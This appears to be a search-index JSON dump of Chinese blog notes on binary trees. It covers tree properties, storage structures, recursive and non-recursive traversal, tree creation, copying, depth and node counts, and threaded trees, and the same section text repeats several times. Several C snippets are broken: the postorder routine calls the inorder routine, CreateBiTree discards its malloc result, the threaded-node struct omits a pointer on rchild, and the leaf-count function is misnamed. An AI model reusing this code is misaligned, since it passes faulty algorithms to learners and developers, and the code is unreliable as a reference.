if(T-\u003elchild==NULL\u0026\u0026T-\u003erchild==NULL) return 1; else return LeafCount(T-\u003elchild)+LeafCount(T-\u003erchild); } 线索二叉树利用二叉链表中的空指针域： 如果某个个结点的左孩子为空，则将空的左孩子指针域改为指向其前驱；如果某结点的右孩子为空，则将空的右孩子指针域改为指向其后继，这种改变指向的指针称为“线索”，加上了线索的二叉树称为线索二叉树（Threaded Binary Tree）。 为区分lchild和rchild指针是指向孩子的指针还是指向前驱或者后继的指针，对二叉链表中每个结点增设两个标志域ltag和rtag，并约定： ltag=0 lchild指向该结点的左孩子 ltag=1 lchild指向该结点的前驱 rtag=0 rchild指向该结点的右孩子 rtag=1 rchild指向该结点的后继 结点的结构： typedef struct BiThrNode{ int data; int ltag,rtag; struct BiThrNode *lchild,rchild; } 为避免第一个结点和最后一个结点悬空 ","date":"2023-12-19","objectID":"/data_structure_notes/:5:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#层次遍历"},{"categories":["notice"],"content":"\r二叉树是n（n\u003e=0）个结点所构成的集合，它或为空树，或为非空树，对于非空树T： 有且仅有一个称之为根的结点 除根结点以外的其余结点分为两个互不相交的子集T1和T2，分别成为T的左子树和右子树，且T1和T2本身又都是二叉树 基本特点： 结点的度\u003c=2 有序树（子树有序，不能颠倒） 二叉树可以是空集合，根可以有空的左子树或者空的右子树 为什么要用二叉树： 结构最简单，规律性最强 可以证明，所有树都能转为唯一对应的二叉树，不失一般性。 普通树若不转化为二叉树，运算很难实现 注： 二叉树不是树的特殊情况，这是两个概念 二叉树结点的子树分为左子树和右子树，而树是不区分左右次序的 **性质1：**在二叉树的第i层上至多有2^(i-1)个结点（至少有1个结点） **性质2：**深度为k的二叉树至多有2^k-1个结点（至少有k个结点） **性质3：**对于任何一棵二叉树，若2度的结点数有n2个，则叶子数n0必定为n2+1（即n0=n2+1） 案例6.1：数据压缩问题将数据文件转换成由0、1组成的二进制串，称之为编码 案例6.2：利用二叉树求解表达式的值以二叉树表示表达式的递归定义如下： （1）若表达式为数或简单变量，则相应二叉树中仅有一个根结点，其数据域存放该表达式信息； （2）若表达式“第一操作数 运算符 第二操作数”的形式，则相应的二叉树中以左子树表示第一操作数，右子树表示第二操作数，根结点的数据域存放运算符（若为一元运算符，则左子树为空），其中，操作数本身有为表达式。 二叉树的抽象数据类型定义\r二叉树的性质\r满二叉树\r满二叉树一定是完全二叉树，完全二叉树不一定是满二叉树 完全二叉树\r注：在满二叉树中，从最后一个结点开始，连续去掉任意个结点，即是一棵完全二叉树 特点： 叶子只可能分布在层次最大的两层上 对任一结点，如果其右子树的最大层次为i，其左子树的最大层必为i或i+1 完全二叉树性质\r二叉树的存储结构\r顺序存储实现：按满二叉树的结点层次编号，一次存放二叉树中的数据元素 //二叉树顺序存储表示 #define MAXSIZE 100 Typedef TElemType SqBiTree[MAXSIZE] SqBiTree bt; 特点：结点间关系蕴含再其存储位置中，浪费空间，适于存满二叉树和完全二叉树 链式存储\r二叉链表 typedef struct BiNode{ TElem Type data; struct BiNode *Lchild,*rchild; }BiNode,*BiTree; 三叉链表 遍历二叉树**遍历定义：**顺着某一条搜索路径巡访二叉树中的结点，使得每个结点均被访问一次，而且仅被访问一次。 **遍历目的：**得到树中的所有结点的一个线性排列。 **遍历用途：**它是树结构插入、删除、修改、查找和排序运算的前提，是二叉树一切运算的基础和核心。 **遍历方法：**依次遍历二叉树中的三个部分，便是遍历了整个二叉树。 若规定先左后右，则只有三种情况： 递归遍历算法先序遍历 Stauts PreOrderTraverse(BiTree T){ if(T==NULL) return OK; //空二叉树 else{ visit(T); //访问根结点 PreOrderTraverse(T-\u003elchild); //递归遍历左子树 PreOrderTraverse(T-\u003erchild); //递归遍历右子树 } } 中序遍历 Status InOrderTraverse(BiTree T){ if(T==NULL) return OK; else{ InOrderTraverse(T-\u003elchild); visit(T); InOrderTraverse(T-\u003erchild); } } 后序遍历 Status PostOrderTraverse(BiTree T){ if(T==NULL) return OK; else{ InOrderTraverse(T-\u003elchild); InOrderTraverse(T-\u003erchild); visit(T); } } 遍历算法分析 时间复杂度：O(n) //每个结点之访问一次 空间效率： O(n) //栈占用的最大辅助空间 非递归遍历以中序遍历为例 使用栈来实现 Status InOrderTraverse(BiTree T){ BiTree p; InitStack(S); p=T; while(p || !StackEmpty(S)){ if(p) {Push(S,p); p=p-\u003elchild;} else {Pop(S,q); printf(\"%c\",q-\u003edata); p=q-\u003erchild;} }//while return OK; } 层次遍历对于一颗二叉树，从根结点开始，按从上到下、从左到右的顺序访问每一个结点。每个结点仅仅访问一次。 使用队列来实现 循环队列类型定义： typedef struct{ BTNode data[MaxSize]; //存放队中元素 int front, rear; //队头和队尾指针 }SqQueue //顺序循环队列类型 层次遍历算法： void LevelOrder(BTNode *b){ BTNode *p; SqQueue *qu; InitQueue(qu); enQueue(qu,b); while(!QueueEmpty(qu)){ deQueue(qu,p); printf(\"%c\",p-\u003edata); if(p-\u003elchild!=NULL) enQueue(qu,p-\u003elchild); if(p-\u003erchild!=NULL) enQueue(qu,p-\u003erchild)； } } 遍历算法的应用\r创建二叉树按先序遍历序列建立二叉树的二叉链表 对下图所示二叉树，按下列顺序读入字符： ABC##DE#G##F### Status CreateBiTree(BiTree \u0026T){ scanf(\u0026ch); if(ch==\"#\") T = NULL; else{ if(!(BiTNode *)malloc(sizeof(BiTNode))) exit(OVERFLOW); T-\u003edata = ch; CreateBiTree(T-\u003elchild); CreateBiTree(T-\u003erchild); } return OK; } 复制二叉树 int Copy(BiTree T, BiTree \u0026NewT){ if(T==NULL){ NewT=NULL; return 0; } else{ NewT=new BiTNode; NewT-\u003edata=T-\u003edata; Copy(T-\u003elChild, NewT-\u003elchild) Copy(T-\u003erChild, NewT-\u003erchild) } } 计算二叉树深度 int Depth(BiTree){ if(T==NULL) return 0; else{ m=Depth(T-\u003elChild); n=Depth(T-\u003erChild); if(m\u003en) return(m+1); else return(n+1);//比较左右子树最大深度并+1 } } 计算二叉树结点总数 int NodeCount(BiTree T){ if(T==NULL) return 0; else return NodeCount(T-\u003elchild)+NodeCount(T-\u003erchild)+1; } 计算二叉树叶子结点总数 int LeadCount(BiTree T){ if(T==NULL) return 0; if(T-\u003elchild==NULL\u0026\u0026T-\u003erchild==NULL) return 1; else return LeafCount(T-\u003elchild)+LeafCount(T-\u003erchild); } 线索二叉树利用二叉链表中的空指针域： 如果某个个结点的左孩子为空，则将空的左孩子指针域改为指向其前驱；如果某结点的右孩子为空，则将空的右孩子指针域改为指向其后继，这种改变指向的指针称为“线索”，加上了线索的二叉树称为线索二叉树（Threaded Binary Tree）。 为区分lchild和rchild指针是指向孩子的指针还是指向前驱或者后继的指针，对二叉链表中每个结点增设两个标志域ltag和rtag，并约定： ltag=0 lchild指向该结点的左孩子 ltag=1 lchild指向该结点的前驱 rtag=0 rchild指向该结点的右孩子 rtag=1 rchild指向该结点的后继 结点的结构： typedef struct BiThrNode{ int data; int ltag,rtag; struct BiThrNode *lchild,rchild; } 为避免第一个结点和最后一个结点悬空 ","date":"2023-12-19","objectID":"/data_structure_notes/:5:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#遍历算法的应用"},{"categories":["notice"],"content":"\r二叉树是n（n\u003e=0）个结点所构成的集合，它或为空树，或为非空树，对于非空树T： 有且仅有一个称之为根的结点 除根结点以外的其余结点分为两个互不相交的子集T1和T2，分别成为T的左子树和右子树，且T1和T2本身又都是二叉树 基本特点： 结点的度\u003c=2 有序树（子树有序，不能颠倒） 二叉树可以是空集合，根可以有空的左子树或者空的右子树 为什么要用二叉树： 结构最简单，规律性最强 可以证明，所有树都能转为唯一对应的二叉树，不失一般性。 普通树若不转化为二叉树，运算很难实现 注： 二叉树不是树的特殊情况，这是两个概念 二叉树结点的子树分为左子树和右子树，而树是不区分左右次序的 **性质1：**在二叉树的第i层上至多有2^(i-1)个结点（至少有1个结点） **性质2：**深度为k的二叉树至多有2^k-1个结点（至少有k个结点） **性质3：**对于任何一棵二叉树，若2度的结点数有n2个，则叶子数n0必定为n2+1（即n0=n2+1） 案例6.1：数据压缩问题将数据文件转换成由0、1组成的二进制串，称之为编码 案例6.2：利用二叉树求解表达式的值以二叉树表示表达式的递归定义如下： （1）若表达式为数或简单变量，则相应二叉树中仅有一个根结点，其数据域存放该表达式信息； （2）若表达式“第一操作数 运算符 第二操作数”的形式，则相应的二叉树中以左子树表示第一操作数，右子树表示第二操作数，根结点的数据域存放运算符（若为一元运算符，则左子树为空），其中，操作数本身有为表达式。 二叉树的抽象数据类型定义\r二叉树的性质\r满二叉树\r满二叉树一定是完全二叉树，完全二叉树不一定是满二叉树 完全二叉树\r注：在满二叉树中，从最后一个结点开始，连续去掉任意个结点，即是一棵完全二叉树 特点： 叶子只可能分布在层次最大的两层上 对任一结点，如果其右子树的最大层次为i，其左子树的最大层必为i或i+1 完全二叉树性质\r二叉树的存储结构\r顺序存储实现：按满二叉树的结点层次编号，一次存放二叉树中的数据元素 //二叉树顺序存储表示 #define MAXSIZE 100 Typedef TElemType SqBiTree[MAXSIZE] SqBiTree bt; 特点：结点间关系蕴含再其存储位置中，浪费空间，适于存满二叉树和完全二叉树 链式存储\r二叉链表 typedef struct BiNode{ TElem Type data; struct BiNode *Lchild,*rchild; }BiNode,*BiTree; 三叉链表 遍历二叉树**遍历定义：**顺着某一条搜索路径巡访二叉树中的结点，使得每个结点均被访问一次，而且仅被访问一次。 **遍历目的：**得到树中的所有结点的一个线性排列。 **遍历用途：**它是树结构插入、删除、修改、查找和排序运算的前提，是二叉树一切运算的基础和核心。 **遍历方法：**依次遍历二叉树中的三个部分，便是遍历了整个二叉树。 若规定先左后右，则只有三种情况： 递归遍历算法先序遍历 Stauts PreOrderTraverse(BiTree T){ if(T==NULL) return OK; //空二叉树 else{ visit(T); //访问根结点 PreOrderTraverse(T-\u003elchild); //递归遍历左子树 PreOrderTraverse(T-\u003erchild); //递归遍历右子树 } } 中序遍历 Status InOrderTraverse(BiTree T){ if(T==NULL) return OK; else{ InOrderTraverse(T-\u003elchild); visit(T); InOrderTraverse(T-\u003erchild); } } 后序遍历 Status PostOrderTraverse(BiTree T){ if(T==NULL) return OK; else{ InOrderTraverse(T-\u003elchild); InOrderTraverse(T-\u003erchild); visit(T); } } 遍历算法分析 时间复杂度：O(n) //每个结点之访问一次 空间效率： O(n) //栈占用的最大辅助空间 非递归遍历以中序遍历为例 使用栈来实现 Status InOrderTraverse(BiTree T){ BiTree p; InitStack(S); p=T; while(p || !StackEmpty(S)){ if(p) {Push(S,p); p=p-\u003elchild;} else {Pop(S,q); printf(\"%c\",q-\u003edata); p=q-\u003erchild;} }//while return OK; } 层次遍历对于一颗二叉树，从根结点开始，按从上到下、从左到右的顺序访问每一个结点。每个结点仅仅访问一次。 使用队列来实现 循环队列类型定义： typedef struct{ BTNode data[MaxSize]; //存放队中元素 int front, rear; //队头和队尾指针 }SqQueue //顺序循环队列类型 层次遍历算法： void LevelOrder(BTNode *b){ BTNode *p; SqQueue *qu; InitQueue(qu); enQueue(qu,b); while(!QueueEmpty(qu)){ deQueue(qu,p); printf(\"%c\",p-\u003edata); if(p-\u003elchild!=NULL) enQueue(qu,p-\u003elchild); if(p-\u003erchild!=NULL) enQueue(qu,p-\u003erchild)； } } 遍历算法的应用\r创建二叉树按先序遍历序列建立二叉树的二叉链表 对下图所示二叉树，按下列顺序读入字符： ABC##DE#G##F### Status CreateBiTree(BiTree \u0026T){ scanf(\u0026ch); if(ch==\"#\") T = NULL; else{ if(!(BiTNode *)malloc(sizeof(BiTNode))) exit(OVERFLOW); T-\u003edata = ch; CreateBiTree(T-\u003elchild); CreateBiTree(T-\u003erchild); } return OK; } 复制二叉树 int Copy(BiTree T, BiTree \u0026NewT){ if(T==NULL){ NewT=NULL; return 0; } else{ NewT=new BiTNode; NewT-\u003edata=T-\u003edata; Copy(T-\u003elChild, NewT-\u003elchild) Copy(T-\u003erChild, NewT-\u003erchild) } } 计算二叉树深度 int Depth(BiTree){ if(T==NULL) return 0; else{ m=Depth(T-\u003elChild); n=Depth(T-\u003erChild); if(m\u003en) return(m+1); else return(n+1);//比较左右子树最大深度并+1 } } 计算二叉树结点总数 int NodeCount(BiTree T){ if(T==NULL) return 0; else return NodeCount(T-\u003elchild)+NodeCount(T-\u003erchild)+1; } 计算二叉树叶子结点总数 int LeadCount(BiTree T){ if(T==NULL) return 0; if(T-\u003elchild==NULL\u0026\u0026T-\u003erchild==NULL) return 1; else return LeafCount(T-\u003elchild)+LeafCount(T-\u003erchild); } 线索二叉树利用二叉链表中的空指针域： 如果某个个结点的左孩子为空，则将空的左孩子指针域改为指向其前驱；如果某结点的右孩子为空，则将空的右孩子指针域改为指向其后继，这种改变指向的指针称为“线索”，加上了线索的二叉树称为线索二叉树（Threaded Binary Tree）。 为区分lchild和rchild指针是指向孩子的指针还是指向前驱或者后继的指针，对二叉链表中每个结点增设两个标志域ltag和rtag，并约定： ltag=0 lchild指向该结点的左孩子 ltag=1 lchild指向该结点的前驱 rtag=0 rchild指向该结点的右孩子 rtag=1 rchild指向该结点的后继 结点的结构： typedef struct BiThrNode{ int data; int ltag,rtag; struct BiThrNode *lchild,rchild; } 为避免第一个结点和最后一个结点悬空 ","date":"2023-12-19","objectID":"/data_structure_notes/:5:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#创建二叉树"},{"categories":["notice"],"content":"\r二叉树是n（n\u003e=0）个结点所构成的集合，它或为空树，或为非空树，对于非空树T： 有且仅有一个称之为根的结点 除根结点以外的其余结点分为两个互不相交的子集T1和T2，分别成为T的左子树和右子树，且T1和T2本身又都是二叉树 基本特点： 结点的度\u003c=2 有序树（子树有序，不能颠倒） 二叉树可以是空集合，根可以有空的左子树或者空的右子树 为什么要用二叉树： 结构最简单，规律性最强 可以证明，所有树都能转为唯一对应的二叉树，不失一般性。 普通树若不转化为二叉树，运算很难实现 注： 二叉树不是树的特殊情况，这是两个概念 二叉树结点的子树分为左子树和右子树，而树是不区分左右次序的 **性质1：**在二叉树的第i层上至多有2^(i-1)个结点（至少有1个结点） **性质2：**深度为k的二叉树至多有2^k-1个结点（至少有k个结点） **性质3：**对于任何一棵二叉树，若2度的结点数有n2个，则叶子数n0必定为n2+1（即n0=n2+1） 案例6.1：数据压缩问题将数据文件转换成由0、1组成的二进制串，称之为编码 案例6.2：利用二叉树求解表达式的值以二叉树表示表达式的递归定义如下： （1）若表达式为数或简单变量，则相应二叉树中仅有一个根结点，其数据域存放该表达式信息； （2）若表达式“第一操作数 运算符 第二操作数”的形式，则相应的二叉树中以左子树表示第一操作数，右子树表示第二操作数，根结点的数据域存放运算符（若为一元运算符，则左子树为空），其中，操作数本身有为表达式。 二叉树的抽象数据类型定义\r二叉树的性质\r满二叉树\r满二叉树一定是完全二叉树，完全二叉树不一定是满二叉树 完全二叉树\r注：在满二叉树中，从最后一个结点开始，连续去掉任意个结点，即是一棵完全二叉树 特点： 叶子只可能分布在层次最大的两层上 对任一结点，如果其右子树的最大层次为i，其左子树的最大层必为i或i+1 完全二叉树性质\r二叉树的存储结构\r顺序存储实现：按满二叉树的结点层次编号，一次存放二叉树中的数据元素 //二叉树顺序存储表示 #define MAXSIZE 100 Typedef TElemType SqBiTree[MAXSIZE] SqBiTree bt; 特点：结点间关系蕴含再其存储位置中，浪费空间，适于存满二叉树和完全二叉树 链式存储\r二叉链表 typedef struct BiNode{ TElem Type data; struct BiNode *Lchild,*rchild; }BiNode,*BiTree; 三叉链表 遍历二叉树**遍历定义：**顺着某一条搜索路径巡访二叉树中的结点，使得每个结点均被访问一次，而且仅被访问一次。 **遍历目的：**得到树中的所有结点的一个线性排列。 **遍历用途：**它是树结构插入、删除、修改、查找和排序运算的前提，是二叉树一切运算的基础和核心。 **遍历方法：**依次遍历二叉树中的三个部分，便是遍历了整个二叉树。 若规定先左后右，则只有三种情况： 递归遍历算法先序遍历 Stauts PreOrderTraverse(BiTree T){ if(T==NULL) return OK; //空二叉树 else{ visit(T); //访问根结点 PreOrderTraverse(T-\u003elchild); //递归遍历左子树 PreOrderTraverse(T-\u003erchild); //递归遍历右子树 } } 中序遍历 Status InOrderTraverse(BiTree T){ if(T==NULL) return OK; else{ InOrderTraverse(T-\u003elchild); visit(T); InOrderTraverse(T-\u003erchild); } } 后序遍历 Status PostOrderTraverse(BiTree T){ if(T==NULL) return OK; else{ InOrderTraverse(T-\u003elchild); InOrderTraverse(T-\u003erchild); visit(T); } } 遍历算法分析 时间复杂度：O(n) //每个结点之访问一次 空间效率： O(n) //栈占用的最大辅助空间 非递归遍历以中序遍历为例 使用栈来实现 Status InOrderTraverse(BiTree T){ BiTree p; InitStack(S); p=T; while(p || !StackEmpty(S)){ if(p) {Push(S,p); p=p-\u003elchild;} else {Pop(S,q); printf(\"%c\",q-\u003edata); p=q-\u003erchild;} }//while return OK; } 层次遍历对于一颗二叉树，从根结点开始，按从上到下、从左到右的顺序访问每一个结点。每个结点仅仅访问一次。 使用队列来实现 循环队列类型定义： typedef struct{ BTNode data[MaxSize]; //存放队中元素 int front, rear; //队头和队尾指针 }SqQueue //顺序循环队列类型 层次遍历算法： void LevelOrder(BTNode *b){ BTNode *p; SqQueue *qu; InitQueue(qu); enQueue(qu,b); while(!QueueEmpty(qu)){ deQueue(qu,p); printf(\"%c\",p-\u003edata); if(p-\u003elchild!=NULL) enQueue(qu,p-\u003elchild); if(p-\u003erchild!=NULL) enQueue(qu,p-\u003erchild)； } } 遍历算法的应用\r创建二叉树按先序遍历序列建立二叉树的二叉链表 对下图所示二叉树，按下列顺序读入字符： ABC##DE#G##F### Status CreateBiTree(BiTree \u0026T){ scanf(\u0026ch); if(ch==\"#\") T = NULL; else{ if(!(BiTNode *)malloc(sizeof(BiTNode))) exit(OVERFLOW); T-\u003edata = ch; CreateBiTree(T-\u003elchild); CreateBiTree(T-\u003erchild); } return OK; } 复制二叉树 int Copy(BiTree T, BiTree \u0026NewT){ if(T==NULL){ NewT=NULL; return 0; } else{ NewT=new BiTNode; NewT-\u003edata=T-\u003edata; Copy(T-\u003elChild, NewT-\u003elchild) Copy(T-\u003erChild, NewT-\u003erchild) } } 计算二叉树深度 int Depth(BiTree){ if(T==NULL) return 0; else{ m=Depth(T-\u003elChild); n=Depth(T-\u003erChild); if(m\u003en) return(m+1); else return(n+1);//比较左右子树最大深度并+1 } } 计算二叉树结点总数 int NodeCount(BiTree T){ if(T==NULL) return 0; else return NodeCount(T-\u003elchild)+NodeCount(T-\u003erchild)+1; } 计算二叉树叶子结点总数 int LeadCount(BiTree T){ if(T==NULL) return 0; if(T-\u003elchild==NULL\u0026\u0026T-\u003erchild==NULL) return 1; else return LeafCount(T-\u003elchild)+LeafCount(T-\u003erchild); } 线索二叉树利用二叉链表中的空指针域： 如果某个个结点的左孩子为空，则将空的左孩子指针域改为指向其前驱；如果某结点的右孩子为空，则将空的右孩子指针域改为指向其后继，这种改变指向的指针称为“线索”，加上了线索的二叉树称为线索二叉树（Threaded Binary Tree）。 为区分lchild和rchild指针是指向孩子的指针还是指向前驱或者后继的指针，对二叉链表中每个结点增设两个标志域ltag和rtag，并约定： ltag=0 lchild指向该结点的左孩子 ltag=1 lchild指向该结点的前驱 rtag=0 rchild指向该结点的右孩子 rtag=1 rchild指向该结点的后继 结点的结构： typedef struct BiThrNode{ int data; int ltag,rtag; struct BiThrNode *lchild,rchild; } 为避免第一个结点和最后一个结点悬空 ","date":"2023-12-19","objectID":"/data_structure_notes/:5:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#复制二叉树"},{"categories":["notice"],"content":"\r二叉树是n（n\u003e=0）个结点所构成的集合，它或为空树，或为非空树，对于非空树T： 有且仅有一个称之为根的结点 除根结点以外的其余结点分为两个互不相交的子集T1和T2，分别成为T的左子树和右子树，且T1和T2本身又都是二叉树 基本特点： 结点的度\u003c=2 有序树（子树有序，不能颠倒） 二叉树可以是空集合，根可以有空的左子树或者空的右子树 为什么要用二叉树： 结构最简单，规律性最强 可以证明，所有树都能转为唯一对应的二叉树，不失一般性。 普通树若不转化为二叉树，运算很难实现 注： 二叉树不是树的特殊情况，这是两个概念 二叉树结点的子树分为左子树和右子树，而树是不区分左右次序的 **性质1：**在二叉树的第i层上至多有2^(i-1)个结点（至少有1个结点） **性质2：**深度为k的二叉树至多有2^k-1个结点（至少有k个结点） **性质3：**对于任何一棵二叉树，若2度的结点数有n2个，则叶子数n0必定为n2+1（即n0=n2+1） 案例6.1：数据压缩问题将数据文件转换成由0、1组成的二进制串，称之为编码 案例6.2：利用二叉树求解表达式的值以二叉树表示表达式的递归定义如下： （1）若表达式为数或简单变量，则相应二叉树中仅有一个根结点，其数据域存放该表达式信息； （2）若表达式“第一操作数 运算符 第二操作数”的形式，则相应的二叉树中以左子树表示第一操作数，右子树表示第二操作数，根结点的数据域存放运算符（若为一元运算符，则左子树为空），其中，操作数本身有为表达式。 二叉树的抽象数据类型定义\r二叉树的性质\r满二叉树\r满二叉树一定是完全二叉树，完全二叉树不一定是满二叉树 完全二叉树\r注：在满二叉树中，从最后一个结点开始，连续去掉任意个结点，即是一棵完全二叉树 特点： 叶子只可能分布在层次最大的两层上 对任一结点，如果其右子树的最大层次为i，其左子树的最大层必为i或i+1 完全二叉树性质\r二叉树的存储结构\r顺序存储实现：按满二叉树的结点层次编号，一次存放二叉树中的数据元素 //二叉树顺序存储表示 #define MAXSIZE 100 Typedef TElemType SqBiTree[MAXSIZE] SqBiTree bt; 特点：结点间关系蕴含再其存储位置中，浪费空间，适于存满二叉树和完全二叉树 链式存储\r二叉链表 typedef struct BiNode{ TElem Type data; struct BiNode *Lchild,*rchild; }BiNode,*BiTree; 三叉链表 遍历二叉树**遍历定义：**顺着某一条搜索路径巡访二叉树中的结点，使得每个结点均被访问一次，而且仅被访问一次。 **遍历目的：**得到树中的所有结点的一个线性排列。 **遍历用途：**它是树结构插入、删除、修改、查找和排序运算的前提，是二叉树一切运算的基础和核心。 **遍历方法：**依次遍历二叉树中的三个部分，便是遍历了整个二叉树。 若规定先左后右，则只有三种情况： 递归遍历算法先序遍历 Stauts PreOrderTraverse(BiTree T){ if(T==NULL) return OK; //空二叉树 else{ visit(T); //访问根结点 PreOrderTraverse(T-\u003elchild); //递归遍历左子树 PreOrderTraverse(T-\u003erchild); //递归遍历右子树 } } 中序遍历 Status InOrderTraverse(BiTree T){ if(T==NULL) return OK; else{ InOrderTraverse(T-\u003elchild); visit(T); InOrderTraverse(T-\u003erchild); } } 后序遍历 Status PostOrderTraverse(BiTree T){ if(T==NULL) return OK; else{ InOrderTraverse(T-\u003elchild); InOrderTraverse(T-\u003erchild); visit(T); } } 遍历算法分析 时间复杂度：O(n) //每个结点之访问一次 空间效率： O(n) //栈占用的最大辅助空间 非递归遍历以中序遍历为例 使用栈来实现 Status InOrderTraverse(BiTree T){ BiTree p; InitStack(S); p=T; while(p || !StackEmpty(S)){ if(p) {Push(S,p); p=p-\u003elchild;} else {Pop(S,q); printf(\"%c\",q-\u003edata); p=q-\u003erchild;} }//while return OK; } 层次遍历对于一颗二叉树，从根结点开始，按从上到下、从左到右的顺序访问每一个结点。每个结点仅仅访问一次。 使用队列来实现 循环队列类型定义： typedef struct{ BTNode data[MaxSize]; //存放队中元素 int front, rear; //队头和队尾指针 }SqQueue //顺序循环队列类型 层次遍历算法： void LevelOrder(BTNode *b){ BTNode *p; SqQueue *qu; InitQueue(qu); enQueue(qu,b); while(!QueueEmpty(qu)){ deQueue(qu,p); printf(\"%c\",p-\u003edata); if(p-\u003elchild!=NULL) enQueue(qu,p-\u003elchild); if(p-\u003erchild!=NULL) enQueue(qu,p-\u003erchild)； } } 遍历算法的应用\r创建二叉树按先序遍历序列建立二叉树的二叉链表 对下图所示二叉树，按下列顺序读入字符： ABC##DE#G##F### Status CreateBiTree(BiTree \u0026T){ scanf(\u0026ch); if(ch==\"#\") T = NULL; else{ if(!(BiTNode *)malloc(sizeof(BiTNode))) exit(OVERFLOW); T-\u003edata = ch; CreateBiTree(T-\u003elchild); CreateBiTree(T-\u003erchild); } return OK; } 复制二叉树 int Copy(BiTree T, BiTree \u0026NewT){ if(T==NULL){ NewT=NULL; return 0; } else{ NewT=new BiTNode; NewT-\u003edata=T-\u003edata; Copy(T-\u003elChild, NewT-\u003elchild) Copy(T-\u003erChild, NewT-\u003erchild) } } 计算二叉树深度 int Depth(BiTree){ if(T==NULL) return 0; else{ m=Depth(T-\u003elChild); n=Depth(T-\u003erChild); if(m\u003en) return(m+1); else return(n+1);//比较左右子树最大深度并+1 } } 计算二叉树结点总数 int NodeCount(BiTree T){ if(T==NULL) return 0; else return NodeCount(T-\u003elchild)+NodeCount(T-\u003erchild)+1; } 计算二叉树叶子结点总数 int LeadCount(BiTree T){ if(T==NULL) return 0; if(T-\u003elchild==NULL\u0026\u0026T-\u003erchild==NULL) return 1; else return LeafCount(T-\u003elchild)+LeafCount(T-\u003erchild); } 线索二叉树利用二叉链表中的空指针域： 如果某个个结点的左孩子为空，则将空的左孩子指针域改为指向其前驱；如果某结点的右孩子为空，则将空的右孩子指针域改为指向其后继，这种改变指向的指针称为“线索”，加上了线索的二叉树称为线索二叉树（Threaded Binary Tree）。 为区分lchild和rchild指针是指向孩子的指针还是指向前驱或者后继的指针，对二叉链表中每个结点增设两个标志域ltag和rtag，并约定： ltag=0 lchild指向该结点的左孩子 ltag=1 lchild指向该结点的前驱 rtag=0 rchild指向该结点的右孩子 rtag=1 rchild指向该结点的后继 结点的结构： typedef struct BiThrNode{ int data; int ltag,rtag; struct BiThrNode *lchild,rchild; } 为避免第一个结点和最后一个结点悬空 ","date":"2023-12-19","objectID":"/data_structure_notes/:5:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#计算二叉树深度"},{"categories":["notice"],"content":"\r二叉树是n（n\u003e=0）个结点所构成的集合，它或为空树，或为非空树，对于非空树T： 有且仅有一个称之为根的结点 除根结点以外的其余结点分为两个互不相交的子集T1和T2，分别成为T的左子树和右子树，且T1和T2本身又都是二叉树 基本特点： 结点的度\u003c=2 有序树（子树有序，不能颠倒） 二叉树可以是空集合，根可以有空的左子树或者空的右子树 为什么要用二叉树： 结构最简单，规律性最强 可以证明，所有树都能转为唯一对应的二叉树，不失一般性。 普通树若不转化为二叉树，运算很难实现 注： 二叉树不是树的特殊情况，这是两个概念 二叉树结点的子树分为左子树和右子树，而树是不区分左右次序的 **性质1：**在二叉树的第i层上至多有2^(i-1)个结点（至少有1个结点） **性质2：**深度为k的二叉树至多有2^k-1个结点（至少有k个结点） **性质3：**对于任何一棵二叉树，若2度的结点数有n2个，则叶子数n0必定为n2+1（即n0=n2+1） 案例6.1：数据压缩问题将数据文件转换成由0、1组成的二进制串，称之为编码 案例6.2：利用二叉树求解表达式的值以二叉树表示表达式的递归定义如下： （1）若表达式为数或简单变量，则相应二叉树中仅有一个根结点，其数据域存放该表达式信息； （2）若表达式“第一操作数 运算符 第二操作数”的形式，则相应的二叉树中以左子树表示第一操作数，右子树表示第二操作数，根结点的数据域存放运算符（若为一元运算符，则左子树为空），其中，操作数本身有为表达式。 二叉树的抽象数据类型定义\r二叉树的性质\r满二叉树\r满二叉树一定是完全二叉树，完全二叉树不一定是满二叉树 完全二叉树\r注：在满二叉树中，从最后一个结点开始，连续去掉任意个结点，即是一棵完全二叉树 特点： 叶子只可能分布在层次最大的两层上 对任一结点，如果其右子树的最大层次为i，其左子树的最大层必为i或i+1 完全二叉树性质\r二叉树的存储结构\r顺序存储实现：按满二叉树的结点层次编号，一次存放二叉树中的数据元素 //二叉树顺序存储表示 #define MAXSIZE 100 Typedef TElemType SqBiTree[MAXSIZE] SqBiTree bt; 特点：结点间关系蕴含再其存储位置中，浪费空间，适于存满二叉树和完全二叉树 链式存储\r二叉链表 typedef struct BiNode{ TElem Type data; struct BiNode *Lchild,*rchild; }BiNode,*BiTree; 三叉链表 遍历二叉树**遍历定义：**顺着某一条搜索路径巡访二叉树中的结点，使得每个结点均被访问一次，而且仅被访问一次。 **遍历目的：**得到树中的所有结点的一个线性排列。 **遍历用途：**它是树结构插入、删除、修改、查找和排序运算的前提，是二叉树一切运算的基础和核心。 **遍历方法：**依次遍历二叉树中的三个部分，便是遍历了整个二叉树。 若规定先左后右，则只有三种情况： 递归遍历算法先序遍历 Stauts PreOrderTraverse(BiTree T){ if(T==NULL) return OK; //空二叉树 else{ visit(T); //访问根结点 PreOrderTraverse(T-\u003elchild); //递归遍历左子树 PreOrderTraverse(T-\u003erchild); //递归遍历右子树 } } 中序遍历 Status InOrderTraverse(BiTree T){ if(T==NULL) return OK; else{ InOrderTraverse(T-\u003elchild); visit(T); InOrderTraverse(T-\u003erchild); } } 后序遍历 Status PostOrderTraverse(BiTree T){ if(T==NULL) return OK; else{ InOrderTraverse(T-\u003elchild); InOrderTraverse(T-\u003erchild); visit(T); } } 遍历算法分析 时间复杂度：O(n) //每个结点之访问一次 空间效率： O(n) //栈占用的最大辅助空间 非递归遍历以中序遍历为例 使用栈来实现 Status InOrderTraverse(BiTree T){ BiTree p; InitStack(S); p=T; while(p || !StackEmpty(S)){ if(p) {Push(S,p); p=p-\u003elchild;} else {Pop(S,q); printf(\"%c\",q-\u003edata); p=q-\u003erchild;} }//while return OK; } 层次遍历对于一颗二叉树，从根结点开始，按从上到下、从左到右的顺序访问每一个结点。每个结点仅仅访问一次。 使用队列来实现 循环队列类型定义： typedef struct{ BTNode data[MaxSize]; //存放队中元素 int front, rear; //队头和队尾指针 }SqQueue //顺序循环队列类型 层次遍历算法： void LevelOrder(BTNode *b){ BTNode *p; SqQueue *qu; InitQueue(qu); enQueue(qu,b); 